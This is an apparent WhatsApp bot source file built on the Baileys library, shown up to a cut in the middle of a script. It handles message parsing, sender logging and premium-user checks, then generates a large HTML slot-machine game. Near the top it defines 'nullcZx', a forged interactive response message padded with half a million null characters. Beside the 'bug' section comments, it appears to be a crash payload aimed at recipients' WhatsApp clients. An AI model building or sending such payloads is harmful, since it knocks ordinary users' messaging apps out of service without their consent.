require('./libraries/settings')
 //END
 //INSTALLING BAILEYS
const fs = require('fs');
const sharp = require('sharp')
const axios = require('axios');
const path = require('path');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const speed = require('performance-now');
const { spawn, exec, execSync } = require('child_process');
const { captureNextLottieSticker, customizeMetadata, sendLottieSticker } = require('was-sticker');
const { promisify } = require('util');
const crypto = require('crypto');
const { Jimp } = require('jimp');
const timestampp = speed();
const latensi = speed() - timestampp;
const { runtime, sleep } = require('./libraries/myfunc');
const {
  default: makeWASocket, proto, getContentType,
  prepareWAMessageMedia, generateIOSMessageID, generateWAMessageFromContent, baileys
} = require("@whiskeysockets/baileys");
const { 
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");
 //END
 //MODULE MESSAGE + PREFIX
 
module.exports = WaSocket = async (WaSocket, m, chatUpdate, store) => {
  const info = m
  const body = (
    m.mtype === "conversation"? m.message?.conversation :
    m.mtype === "imageMessage"? m.message?.imageMessage?.caption :
    m.mtype === "videoMessage"? m.message?.videoMessage?.caption :
    m.mtype === "extendedTextMessage"? m.message?.extendedTextMessage?.text :
    m.mtype === "buttonsResponseMessage"? m.message?.buttonsResponseMessage?.selectedButtonId :
    m.mtype === "listResponseMessage"? m.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
    m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
    m.mtype === "templateButtonReplyMessage"? m.message?.templateButtonReplyMessage?.selectedId :
    m.mtype === "interactiveResponseMessage"? (() => {
      try { return JSON.parse(m.msg?.nativeFlowResponseMessage?.paramsJson)?.id } catch { return "" }
    })() :
    m.mtype === "messageContextInfo"?
      m.message?.buttonsResponseMessage?.selectedButtonId ||
      m.message?.listResponseMessage?.singleSelectReply?.selectedRowId :
    m.mtype === "interactiveMessage"?
      m.message?.interactiveMessage?.header?.title ||
      m.message?.interactiveMessage?.body?.text ||
      m.message?.interactiveMessage?.footer?.text ||
      m.text : ""
  ) || "";
  if (!m?.key) return;

  const sender = m.key.fromMe 
  ? WaSocket.user?.id?.split(":")[0] || WaSocket.user?.id 
   : m.key.participant || m.key.remoteJid;
  const senderNumber = sender?.split('@')[0] || "";
  const budy = (typeof m.text === 'string'? m.text : '');
  const prefa = ["", "!", ".", ",", "🐤", "🗿"];
  const prefix = prefa? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body)? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa?? prefa;
  const from = m.key.remoteJid;
  if (!from) return;
  const isGroup = from.endsWith("@g.us");
  const isChannel = from.endsWith("@newsletter");
  const botNumber = await WaSocket.decodeJid(WaSocket.user.id);
  const now = new Date()
  const tanggalx = `${String(now.getDate()).padStart(2, "0")}-${String(now.getMonth() + 1).padStart(2, "0")}-${now.getFullYear()}`
  const Premiumz = JSON.parse(fs.readFileSync('./libraries/databases/premiumz.json'));
  const aiJid = "13135550002@s.whatsapp.net"
  const isPremium = [botNumber, ...Premiumz].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
  const isBot = botNumber.includes(senderNumber)
  //DEVICE CHECK 
  const deviceC = info.key.id.length > 21 ? 'Android' : info.key.id.substring(0, 2) === '3A' ? 'IPhone' : 'WhatsApp web';
  const jids = `@${m.sender.split("@")[0]}`; 
  const isCmd = (body || budy).startsWith(prefix)? true : false
  const command = isCmd? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : "";
  const args = body.trim().split(/ +/).slice(1);
  const pushname = m.pushName || "";
  const text = q = args.join(" ");
  const quoted = m.quoted? m.quoted : m;
  const mime = (quoted.msg || quoted).mimetype || '';
  const groupMetadata = isGroup? await WaSocket.groupMetadata(from).catch(_ => null) : null;
  const groupOwner = isGroup? groupMetadata?.owner : "";
  const groupName = isGroup? groupMetadata?.subject : "";
  const participants = isGroup? groupMetadata?.participants || [] : [];
  const groupAdmins = isGroup? participants.filter((v) => v.admin!== null).map((v) => v.id) : [];
  const groupMembers = isGroup? participants : [];
  const isGroupAdmins = isGroup? groupAdmins.includes(m.sender) : false;
  const isBotGroupAdmins = isGroup? groupAdmins.includes(botNumber) : false;
  const isBotAdmins = isGroup? groupAdmins.includes(botNumber) : false;
  const isAdmins = isGroup? groupAdmins.includes(m.sender) : false;
  
  //END


  //DATA TAMBAHAN + PELENGKAP

  const { sleep } = require('./libraries/myfunc');
  const time = moment.tz("Asia/Jakarta").format("HH:mm:ss"); 
  const { igdownloadz } = require('./libraries/lib/Instagram');
  const { tiktokdownloadz } = require('./libraries/lib/tiktok');
  const { paymentx } = require('./libraries/payment');
  const { x1zp } = require('./libraries/contacts');
  const vidx = fs.readFileSync('./libraries/lib/media/x-videox.mp4');
  //END
  
  function formatNumber(input) {
    if (!input) return null;
    let number = input.replace(/[^0-9]/g, '');
    if (number.startsWith('0')) {
    number = '62' + number.slice(1);
  } else if (!number.startsWith('62')) {number = '62' + number; }
    if (number.length < 10 || number.length > 15) return null;
    return number + '@s.whatsapp.net';
  }
  function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
  }
  // START 
  
  if (m.message) {
    const messageType = Object.keys(m.message)[0] 
    console.log('--------------------');
    console.log(`「  New Message  」`);
    console.log(
        ` ▢ Tanggal: ${chalk.green(new Date().toLocaleString())} \n` +
        ` ▢ Pesan: ${chalk.green(messageType)} \n` +
        ` ▢ Pengirim: ${chalk.green(pushname)} \n` +
        ` ▢ Device: ${chalk.green(deviceC)} \n` +
        ` ▢ JID : ${chalk.green(senderNumber)} \n`
    );

    console.log('Data Result:', util.inspect({ 
      [messageType]: m.message[messageType] 
    }, { depth: 1, colors: true }));
      console.log();
  }
  
  // END
  
  const nullcZx = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net"
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
        }
      }
    }
  }; 
  // END
  
  const reply = async (text) => {
    await WaSocket.sendMessage(from, {
        text: text
    }, { quoted: x1zp })
  }
  
  async function generateThumbnailz(x) {
    let buffer
    if (/^https?:\/\//.test(x)) {
      const res = await axios.get(x, { responseType: 'arraybuffer', timeout: 30000 })
      buffer = Buffer.from(res.data)
    } else {
      buffer = fs.readFileSync(x)
    }
    return await sharp(buffer).resize(300, 300, { fit: 'cover' }).jpeg({ quality: 100 }).toBuffer()
  }
  const thumb = await generateThumbnailz('./libraries/lib/media/w-shennmine.jpg') 
  
//===[ ASYIFUNCTION BUG ALL ]====//


//===[ ASYIFUNCTION END BUG ]===//

// ================================================================
// ================ FUNGSI GENERATE HTML SLOT =====================
// ================================================================

function generateSlotHTML(credits = 500, bet = 10) {
    return `<!DOCTYPE html>
<html>
<head>
<style>
/* ===== SEMUA CSS DARI KODE AWAL ===== */
*{box-sizing:border-box}html,body{margin:0;width:100%;overflow:hidden;background:transparent;font-family:Arial,sans-serif;overscroll-behavior:none}body{padding:9px;background:radial-gradient(circle at 50% 12%,#5b2d18,#160908 55%,#030202)}.machine{position:relative;overflow:hidden;padding:13px 34px 18px 13px;border:4px solid #2b0c05;border-radius:30px;background:linear-gradient(105deg,#1e0704,#8c3515 8%,#3b1008 20%,#611e0c 52%,#2b0906 82%,#9c401b 94%,#2a0b06);box-shadow:inset 0 0 0 3px #e6a139,inset 0 0 0 7px #5d210b,inset 0 20px 35px #ffb52a22,0 8px 0 #210705,0 14px 24px #000c;touch-action:none}.machine:before{content:"";position:absolute;inset:8px;border:2px solid #ffba3d;border-radius:22px;pointer-events:none;box-shadow:inset 0 0 11px #ff7b00}.lights{height:9px;margin:0 14px 8px;border:2px solid #6f2608;border-radius:8px;background:repeating-radial-gradient(circle at 6px 50%,#fffbd3 0 2px,#ffbd00 3px 5px,#641800 6px 12px);box-shadow:0 0 12px #ff8a00;animation:lights .55s steps(2) infinite}.title{padding:11px 4px 8px;border:3px solid #ffc54c;border-radius:50% 50% 11px 11px/30% 30% 10px 10px;color:#fff2a1;background:radial-gradient(ellipse at 50% 0,#12b2bc,#075165 58%,#06182a);box-shadow:inset 0 0 0 4px #74300d,inset 0 -11px 18px #001726,0 4px 0 #3b1207;text-align:center;font:25px Impact,Arial Black,sans-serif;letter-spacing:1px;text-shadow:0 3px #8f1c0c,2px 0 #8f1c0c,-2px 0 #8f1c0c}.jackpot{width:75%;margin:5px auto 8px;padding:4px;border:2px solid #ffcf5b;border-radius:10px;color:#ffe7a1;background:linear-gradient(#741523,#29060e);box-shadow:inset 0 2px 5px #ff667744;text-align:center;font:bold 10px monospace;letter-spacing:1px}.stats{display:flex;margin:0 2px 9px;padding:5px;border:2px solid #b66b20;border-radius:9px;background:linear-gradient(#210c08,#070303);box-shadow:inset 0 0 9px #000,0 3px 0 #4a1909}.stat{flex:1;border-right:1px solid #754016;color:#d6a15b;text-align:center;font:bold 10px monospace}.stat:last-child{border:0}.stat b{display:block;margin-top:2px;color:#fff0bb;font-size:15px;text-shadow:0 0 6px #f80}.frame{position:relative;padding:9px;border:5px solid #9b4e12;border-radius:18px;background:linear-gradient(90deg,#4b1c08,#ffd873 5%,#6a2709 10%,#6a2709 90%,#ffd873 95%,#421506);box-shadow:inset 0 0 0 3px #2b0d05,0 4px 0 #301005,0 8px 15px #000b}.reelbox{position:relative;display:grid;grid-template-columns:repeat(5,1fr);height:192px;overflow:hidden;border:3px solid #1d0804;border-radius:11px;background:#140604;box-shadow:inset 0 13px 20px #000,inset 0 -13px 20px #000}.reel{position:relative;overflow:hidden;border-right:2px solid #6e421e;background:linear-gradient(90deg,#a58149,#fffce4 17%,#fffdf0 50%,#f7e9bd 82%,#8e6a38);box-shadow:inset 7px 0 8px #573b1d66,inset -7px 0 8px #573b1d66}.reel:last-child{border:0}.reel:after{content:"";position:absolute;z-index:2;inset:0;pointer-events:none;background:linear-gradient(#3b1d0fbb 0,transparent 18%,transparent 80%,#281208cc 100%);box-shadow:inset 0 9px 11px #0005,inset 0 -9px 11px #0005}.strip{position:absolute;left:0;right:0;top:0;transform:translate3d(0,0,0);will-change:transform,filter}.strip.moving{filter:blur(1.4px) saturate(1.2)}.sym{height:64px;display:grid;place-items:center;border-bottom:1px solid #9f7e4f66;color:#d30f1c;font-family:Apple Color Emoji,Segoe UI Emoji,Arial Black,sans-serif;font-size:clamp(26px,8vw,40px);line-height:1;text-shadow:0 3px 0 #721018,0 0 4px #fff;transform:translateZ(0)}.sym.s4{font:900 42px Impact,Arial Black,sans-serif;color:#ef1726;-webkit-text-stroke:2px #850815;text-shadow:0 3px #5d0509,0 0 5px #fff}.sym.s5{font:900 16px Arial Black,sans-serif;color:#fff4c4;background:radial-gradient(ellipse at center,#e22d35 0,#6f0910 52%,transparent 54%);text-shadow:0 2px #401010}.sym.win{animation:win .5s ease-in-out infinite;background:radial-gradient(circle,#fff8a9,#ffae00 55%,transparent 72%)}.shine{position:absolute;z-index:3;inset:4px 8% 55%;border-radius:50%;background:linear-gradient(#fff7,transparent);pointer-events:none}.payline{position:absolute;z-index:4;left:9px;right:9px;height:3px;opacity:0;background:#fff5a1;box-shadow:0 0 7px #fff,0 0 14px #ff3d00;pointer-events:none}.payline.on{animation:line 1s ease infinite}.p0{top:20%}.p1{top:50%}.p2{top:80%}.message{height:34px;margin:9px 2px 7px;display:grid;place-items:center;border:2px solid #a55c19;border-radius:8px;color:#ffd46a;background:#150504;box-shadow:inset 0 0 8px #000;text-align:center;font:bold 14px monospace;text-shadow:0 0 7px #f60}.console{display:grid;grid-template-columns:1fr 1.7fr;gap:8px;margin:0 3px;padding:10px 9px 13px;border:3px solid #8e4914;border-radius:9px 9px 17px 17px;background:linear-gradient(#d69a49,#63300f 37%,#2a0b06 39%,#4b1509);box-shadow:inset 0 2px #ffe0a0,0 5px #1c0704,0 9px 12px #0008;transform:perspective(300px) rotateX(4deg)}button{height:53px;border:3px solid #351006;border-radius:13px;color:#fff;font-weight:900;touch-action:none}.bet{background:linear-gradient(#42c4df,#086184 53%,#03334c);box-shadow:inset 0 4px 4px #fff8,0 4px #051e2a}.spin{background:radial-gradient(circle at 50% 32%,#8aff77,#20a72d 47%,#075b17 76%);box-shadow:inset 0 4px 5px #e3ffdc,0 4px #07350e,0 0 14px #3cff4a;font-size:18px;text-shadow:0 2px #06420d}.tray{width:49%;height:19px;margin:14px auto 0;border:4px solid #48200b;border-radius:4px 4px 10px 10px;background:#090303;box-shadow:inset 0 6px 9px #000,0 3px #c47c29}.leverTrack{position:absolute;z-index:5;right:9px;top:211px;width:20px;height:150px;border:2px solid #3d1809;border-radius:13px;background:linear-gradient(90deg,#321006,#df9a39,#52200a);box-shadow:inset 0 0 5px #000}.lever{position:absolute;left:-4px;top:8px;width:28px;height:112px;transform-origin:50% 88%;transition:transform .34s cubic-bezier(.2,.8,.2,1);touch-action:none}.lever:before{content:"";position:absolute;left:11px;top:17px;width:7px;height:86px;border:2px solid #333;border-radius:4px;background:linear-gradient(90deg,#444,#fff 48%,#666 64%,#222)}.lever:after{content:"";position:absolute;left:0;width:29px;height:29px;border:3px solid #650000;border-radius:50%;background:radial-gradient(circle at 35% 25%,#fff,#ff7777 13%,#ed1720 37%,#850007 74%);box-shadow:inset -5px -6px 7px #490000,0 4px 5px #000,0 0 9px #f22}.lever.pull{transform:rotate(36deg)}.over{position:absolute;z-index:10;inset:0;display:grid;place-items:center;text-align:center;color:#ffe5a0;background:#080100ed}.over.off{display:none}.over h2{margin:0 0 8px;color:#ff3449;text-shadow:0 0 12px #f00}.over button{padding:0 22px;background:#ffd15a;color:#271204}@keyframes lights{50%{filter:brightness(1.7)}}@keyframes win{50%{transform:scale(1.09);filter:brightness(1.4)}}@keyframes line{50%{opacity:1}}
</style>
<style>.reelbox{display:block;height:205px;padding:0;background:#160704}
#reelCanvas{display:block;width:100%;height:100%;border-radius:8px;touch-action:none}
</style>
<style>body{padding:15px 13px 29px;perspective:950px}
.machine{transform-origin:50% 88%;transform:perspective(850px) rotateX(1.2deg) translateZ(0);box-shadow:inset 0 0 0 3px #f0b64b,inset 0 0 0 8px #501708,inset 14px 0 24px #ffb3421f,inset -15px 0 25px #16030199,0 9px 0 #180503,0 17px 0 #421508,0 27px 35px #000e}
.machine:after{content:"";position:absolute;z-index:-2;left:7%;right:7%;bottom:-30px;height:30px;border-radius:50%;background:radial-gradient(ellipse,#000d 0,#0008 42%,transparent 73%);filter:blur(4px)}
.title{transform:perspective(500px) rotateX(-3deg) translateZ(8px);box-shadow:inset 0 0 0 4px #74300d,inset 0 -13px 20px #001522,0 5px 0 #351006,0 10px 16px #0009}
.frame{transform:perspective(650px) rotateX(-1.5deg) translateZ(7px);box-shadow:inset 0 0 0 3px #2b0d05,inset 0 12px 13px #fff2b21c,0 6px 0 #291006,0 13px 19px #000c}
.console{transform:perspective(420px) rotateX(8deg) translateZ(5px);transform-origin:50% 0;box-shadow:inset 0 3px #ffe4ac,0 7px #1b0704,0 15px 20px #000b}
.machine.charging{animation:crateCharge .56s cubic-bezier(.36,.07,.19,.97) both}
.machine.charging .lights{animation:warningFlash .12s steps(2) infinite}
.machine.charging .frame{animation:frameTension .56s ease both}
.machine.charging .title{animation:signTension .56s ease both}
@keyframes crateCharge{0%{transform:perspective(850px) rotateX(1.2deg) rotateZ(0) translate(0,0) scale(1)}12%{transform:perspective(850px) rotateX(2deg) rotateZ(-.8deg) translate(-2px,1px) scale(.995)}25%{transform:perspective(850px) rotateX(.2deg) rotateZ(1deg) translate(3px,-1px) scale(1.008)}39%{transform:perspective(850px) rotateX(2.2deg) rotateZ(-1.15deg) translate(-3px,1px) scale(.998)}52%{transform:perspective(850px) rotateX(.3deg) rotateZ(.9deg) translate(3px,-2px) scale(1.012)}66%{transform:perspective(850px) rotateX(2deg) rotateZ(-.55deg) translate(-2px,1px) scale(1.004)}79%{transform:perspective(850px) rotateX(.7deg) rotateZ(.35deg) translate(1px,-1px) scale(1.01)}100%{transform:perspective(850px) rotateX(1.2deg) rotateZ(0) translate(0,0) scale(1)}}
@keyframes warningFlash{50%{filter:brightness(2.2) saturate(1.8);box-shadow:0 0 21px #ffca28}}
@keyframes frameTension{45%{transform:perspective(650px) rotateX(-2.5deg) translateZ(13px) scale(1.012)}100%{transform:perspective(650px) rotateX(-1.5deg) translateZ(7px)}}
@keyframes signTension{45%{transform:perspective(500px) rotateX(-5deg) translateZ(15px)}100%{transform:perspective(500px) rotateX(-3deg) translateZ(8px)}}
</style>
<style>.machine.charging{animation:leverDip .28s cubic-bezier(.25,.8,.25,1) both}
.machine.charging .frame,.machine.charging .title{animation:none}
.machine.reelKick{animation:reelKick .13s cubic-bezier(.2,.8,.3,1)}
@keyframes leverDip{0%{transform:perspective(850px) rotateX(1.2deg) translateY(0) scale(1)}42%{transform:perspective(850px) rotateX(2.4deg) translateY(3px) scale(.994)}72%{transform:perspective(850px) rotateX(.5deg) translateY(-2px) scale(1.004)}100%{transform:perspective(850px) rotateX(1.2deg) translateY(0) scale(1)}}
@keyframes reelKick{0%{transform:perspective(850px) rotateX(1.2deg) translateX(0)}35%{transform:perspective(850px) rotateX(1.7deg) translateX(-1.5px) translateY(1px)}70%{transform:perspective(850px) rotateX(.8deg) translateX(1px) translateY(-1px)}100%{transform:perspective(850px) rotateX(1.2deg) translateX(0)}}
</style>
<style>.machine.charging,.machine.reelKick{animation:none!important}
.machine.charging .frame,.machine.charging .title,.machine.charging .lights{animation:none!important}
.leverTrack{right:9px;top:211px;width:24px;height:158px;overflow:hidden;border-radius:12px}
.lever{left:0;top:7px;width:24px;height:100px;transform:none;transform-origin:50% 50%;transition:transform .3s cubic-bezier(.2,.8,.2,1)}
.lever:before{left:8px;top:18px;width:7px;height:77px}
.lever:after{left:0;top:0;width:24px;height:24px;border-width:2px}
.lever.pull{transform:translateY(47px)}
</style>
<style>
.machine{padding-right:70px!important;}
.leverTrack{position:absolute!important;right:8px!important;top:205px!important;width:56px!important;height:150px!important;overflow:hidden!important;border-radius:16px!important;transform:none!important;}
.leverTrack:after{content:"";position:absolute;left:2px;bottom:1px;width:27px;height:27px;z-index:3;border:2px solid #5b2509;border-radius:50%;box-sizing:border-box;background:radial-gradient(circle at 35% 30%,#fff6c8 0 8%,#f7bd3d 9% 25%,#9b3d08 52%,#3a1205 76%);box-shadow:inset 0 0 0 3px #ffda67,0 2px 5px #000b;}
.lever{position:absolute!important;left:2px!important;top:auto!important;bottom:9px!important;width:27px!important;height:105px!important;transform:rotate(0deg)!important;transform-origin:13.5px 95px!important;transition:transform .34s cubic-bezier(.2,.88,.25,1.08)!important;z-index:2!important;}
.lever:before{left:10px!important;top:18px!important;width:7px!important;height:80px!important;border-radius:5px!important;background:linear-gradient(90deg,#321003 0,#f3c56f 20%,#fff5cf 43%,#9b4c18 72%,#260b02 100%)!important;box-shadow:0 2px 4px #000b!important;}
.lever:after{left:1px!important;top:0!important;width:24px!important;height:24px!important;border-width:2px!important;}
.lever.pull{transform:rotate(17deg)!important;}
</style>
<style>
.lever{transform:none!important;transform-origin:50% 100%!important;transition:none!important;}
.lever:before{transform:scaleY(1)!important;transform-origin:50% 100%!important;transition:transform .34s cubic-bezier(.2,.85,.25,1)!important;}
.lever:after{transform:translateY(0) scale(1)!important;transform-origin:50% 50%!important;transition:transform .34s cubic-bezier(.2,.85,.25,1.08)!important;}
.lever.pull{transform:none!important;}
.lever.pull:before{transform:scaleY(.56)!important;}
.lever.pull:after{transform:translateY(36px) scale(1.16)!important;}
</style>
<style>
.machine{padding-right:62px!important}
.leverTrack{right:8px!important;top:205px!important;width:47px!important;height:150px!important;overflow:hidden!important}
.leverTrack:after{left:9px!important;bottom:5px!important;width:27px!important;height:27px!important;z-index:4!important}
.lever{left:0!important;right:0!important;bottom:12px!important;top:auto!important;width:100%!important;height:112px!important;transform:none!important}
.lever:before,.lever:after{display:none!important}
.leverArm{position:absolute;left:20px;bottom:7px;width:7px;height:91px;border:2px solid #292929;border-radius:5px;box-sizing:border-box;background:linear-gradient(90deg,#3c3c3c,#fff 43%,#8a8a8a 68%,#252525);box-shadow:0 2px 4px #000b;transform:scaleY(1);transform-origin:50% 100%;transition:transform .34s cubic-bezier(.2,.82,.25,1)}
.leverKnob{position:absolute;left:-10px;top:-13px;width:27px;height:27px;border:3px solid #650000;border-radius:50%;box-sizing:border-box;background:radial-gradient(circle at 35% 25%,#fff,#ff7777 13%,#ed1720 37%,#850007 74%);box-shadow:inset -5px -6px 7px #490000,0 4px 5px #000,0 0 9px #f22;transform:scaleY(1) scale(1);transition:transform .34s cubic-bezier(.2,.82,.25,1)}
.lever.pull .leverArm{transform:scaleY(.52)}
.lever.pull .leverKnob{transform:scaleY(1.9231) scale(1.12)}
</style>
<style>
.leverTrack{display:none!important}
html,body{min-height:0!important}
body{padding:4px!important}
.machine{padding:8px 10px 10px!important;border-width:3px!important;border-radius:22px!important;box-shadow:inset 0 0 0 2px #e6a139,inset 0 0 0 5px #5d210b,inset 0 14px 25px #ffb52a22,0 5px 0 #210705,0 9px 16px #000c!important}
.machine:before{inset:6px!important;border-radius:17px!important}
.lights{height:7px!important;margin:0 12px 5px!important}
.title{padding:7px 4px 5px!important;font-size:21px!important}
.jackpot{margin:3px auto 5px!important;padding:3px!important}
.stats{margin:0 2px 6px!important;padding:4px!important}
.stat b{font-size:13px!important;margin-top:1px!important}
.frame{padding:6px!important;border-width:4px!important;border-radius:14px!important}
.reelbox{height:150px!important;border-radius:9px!important}
.message{height:29px!important;margin:6px 2px 5px!important;font-size:12px!important}
.console{gap:7px!important;margin:0 3px!important;padding:7px 8px 9px!important}
button{height:44px!important}
.spin{font-size:16px!important}
.tray{height:14px!important;margin-top:9px!important;border-width:3px!important}
</style>
<style>
body{background:radial-gradient(circle at 50% 8%,#1d6a50,#0f4938 48%,#07291f)!important}
.machine{border-color:#071f18!important;background:linear-gradient(110deg,#061e17,#1b644b 10%,#0b382a 24%,#15543f 54%,#092f24 82%,#28775a 94%,#071f18)!important;box-shadow:inset 0 0 0 2px #b9954d,inset 0 0 0 5px #163f31,inset 0 14px 24px #73d2a31c,0 5px 0 #041a13,0 9px 16px #000b!important}
.machine:before{border-color:#b59349!important;box-shadow:inset 0 0 9px #4fa57a66!important}
.lights{border-color:#123d2f!important;background:repeating-radial-gradient(circle at 6px 50%,#dfffdc 0 2px,#82c878 3px 5px,#164936 6px 12px)!important;box-shadow:0 0 9px #67b881!important}
.title{border-color:#b99a54!important;color:#e9e3bc!important;background:radial-gradient(ellipse at 50% 0,#2b8a6c,#11513f 58%,#082a24)!important;box-shadow:inset 0 0 0 4px #244f3d,inset 0 -10px 17px #061e19,0 4px 0 #071d16!important;text-shadow:0 2px #193f31,2px 0 #193f31,-2px 0 #193f31!important}
.jackpot{border-color:#a98c4d!important;color:#ded7ad!important;background:linear-gradient(#245d48,#0b3025)!important;box-shadow:inset 0 2px 5px #8ed3a233!important}
.stats,.message{border-color:#537d64!important;background:linear-gradient(#102d24,#061812)!important}
.stat{border-color:#416452!important;color:#91b59f!important}.stat b,.message{color:#e3dfbb!important;text-shadow:0 0 6px #62a77d!important}
.frame{border-color:#315c47!important;background:linear-gradient(90deg,#09271e,#b49a59 5%,#174936 10%,#174936 90%,#b49a59 95%,#09271e)!important;box-shadow:inset 0 0 0 3px #071b15,0 4px 0 #09271e,0 8px 15px #000a!important}
.reelbox{border-color:#071c15!important;background:#071a14!important;box-shadow:inset 0 9px 15px #0009,inset 0 -9px 15px #0009!important}
.shine{display:none!important}
.console{border-color:#416a53!important;background:linear-gradient(#9c8c59,#315d48 37%,#0a2e22 39%,#123e2f)!important;box-shadow:inset 0 2px #d9c992,0 5px #061d16,0 9px 12px #0008!important}
.bet{background:linear-gradient(#4f9a77,#216348 53%,#103d2d)!important;box-shadow:inset 0 4px 4px #d8ffe055,0 4px #092a20!important}
.spin{background:radial-gradient(circle at 50% 32%,#a8d96f,#4b8d46 47%,#1e542f 76%)!important;box-shadow:inset 0 4px 5px #e8ffd488,0 4px #12351e,0 0 12px #79b85c88!important}
.tray{border-color:#244d3a!important;background:#061a13!important;box-shadow:inset 0 6px 9px #000,0 3px #897945!important}
</style>
<style>
.payline{height:3px!important;background:linear-gradient(90deg,transparent,#dfff8a 18%,#fff5b0 50%,#7fe091 82%,transparent)!important;box-shadow:0 0 7px #efffa8,0 0 15px #65c984!important;transform:scaleX(.15);transform-origin:50% 50%}
.payline.on{opacity:1!important;animation:jungleLine 1.15s cubic-bezier(.2,.8,.2,1) infinite!important}
.machine.winner .message{animation:jungleDisplay .7s ease-in-out 2!important}
.machine.winner .lights{animation:jungleLights .22s steps(2) 6!important}
.machine.winner .title{animation:jungleTitle .7s ease-in-out 2!important}
@keyframes jungleLine{0%{transform:scaleX(.08);filter:brightness(1)}45%{transform:scaleX(1);filter:brightness(1.8)}75%,100%{transform:scaleX(1);opacity:0}}
@keyframes jungleDisplay{50%{color:#fff8bd;box-shadow:inset 0 0 14px #7ddc8a,0 0 13px #74ce82;filter:brightness(1.35)}}
@keyframes jungleLights{50%{filter:brightness(2.2) saturate(1.4)}}
@keyframes jungleTitle{50%{filter:brightness(1.35);text-shadow:0 0 12px #cfff91,0 2px #193f31}}
</style>
<style>
.machine{box-shadow:inset 0 0 0 2px #b9954d,inset 0 0 0 5px #163f31,inset 0 14px 24px #73d2a31c!important;}
</style>
<style>
html,body{width:100%!important}
body{padding:0!important}
.machine{width:100%!important;margin:0!important}
</style>
</head>
<body><div class="machine" id="machine"><div class="lights"></div><div class="title">FRUIT BONANZA</div><div class="jackpot">JACKPOT · 10,000 CREDITS</div><div class="stats"><div class="stat">CREDITS<b id="credits">${credits}</b></div><div class="stat">BET<b id="betValue">${bet}</b></div><div class="stat">BEST WIN<b id="best">0</b></div></div><div class="frame"><div id="reelbox" class="reelbox"><canvas id="reelCanvas"></canvas></div><div class="shine"></div><i class="payline p0"></i><i class="payline p1"></i><i class="payline p2"></i></div><div id="message" class="message">SPIN TO PLAY</div><div class="console"><button id="bet" class="bet">BET +</button><button id="spin" class="spin">SPIN</button></div><div class="tray"></div><div class="leverTrack"><div id="lever" class="lever"><i class="leverArm"><i class="leverKnob"></i></i></div></div><div id="over" class="over off"><div><h2>GAME OVER</h2><p>Keine Credits mehr.<br>Best Win: <b id="finalBest">0</b></p><button id="restart">NEW GAME</button></div></div></div>
<script>
(function(){
var labels=['🍒','🍋','🔔','💎','7','BAR'],weights=[30,25,18,12,8,7],pays=[2,3,5,8,12,20];
var credits = ${credits}, bet = ${bet}, best = 0, busy = false, winCells = [], reels = [], sparks = [], winUntil = 0;
var canvas = document.getElementById('reelCanvas'), ctx = canvas.getContext('2d');
var C = document.getElementById('credits'), BV = document.getElementById('betValue'), BS = document.getElementById('best');
var MSG = document.getElementById('message'), SP = document.getElementById('spin'), BT = document.getElementById('bet');
var LV = document.getElementById('lever'), OV = document.getElementById('over'), FB = document.getElementById('finalBest');
var MCH = document.getElementById('machine'), PL = document.querySelectorAll('.payline');
var D = Math.min(devicePixelRatio||1,2), W, H, last = 0, startTime = 0;

function pick(){var n=Math.random()*100,s=0;for(var i=0;i<weights.length;i++){s+=weights[i];if(n<s)return i}return 0}
function buildStrip(){var a=[];for(var i=0;i<80;i++)a.push(pick());return a}
function resize(){var r=canvas.getBoundingClientRect();W=r.width;H=r.height;canvas.width=Math.round(W*D);canvas.height=Math.round(H*D);ctx.setTransform(D,0,0,D,0,0);draw()}
function ui(){C.textContent=credits;BV.textContent=bet;BS.textContent=best}
function clearWins(){winCells=[];sparks=[];winUntil=0;MCH.classList.remove('winner');for(var i=0;i<PL.length;i++)PL[i].classList.remove('on')}
for(var c=0;c<5;c++)reels.push({strip:buildStrip(),pos:Math.floor(Math.random()*60),speed:0,stop:0,stopped:true,decelStart:null,from:0,target:0});
function mod(n,m){return((n%m)+m)%m}
